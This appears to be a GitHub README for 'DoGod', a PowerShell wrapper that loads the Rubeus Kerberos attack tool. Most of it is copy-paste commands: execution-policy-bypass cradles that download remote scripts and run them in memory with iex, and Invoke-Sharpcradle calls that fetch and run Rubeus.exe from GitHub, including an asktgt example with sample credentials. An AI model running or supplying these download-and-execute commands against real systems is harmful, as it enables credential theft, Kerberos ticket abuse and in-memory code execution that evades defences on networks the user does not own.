# DoGod
*Rubeus wrapped in PowerShell*

import-module ./DoGod.ps1 ---> Loads Rubeus

DogGod ---> Rubeus native help menu

Use Onscreen Instructions for DoGod syntax!

Way 1:
IEX:

Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/DoGod/main/DoGod.ps1'))

Way 2 (for running updated version : v2.2.0):

Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/OFFSEC-PowerShell/main/Invoke-Sharpcradle.ps1'))

Rubeus Commands:
Invoke-Sharpcradle -Uri https://raw.githubusercontent.com/IAMinZoho/DoGod/main/Rubeus.exe

or,

Invoke-Sharpcradle -Uri https://raw.githubusercontent.com/IAMinZoho/DoGod/main/Rubeus.exe -Argument1 asktgt /user:Bob /password:user@123


Rubeus.exe: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
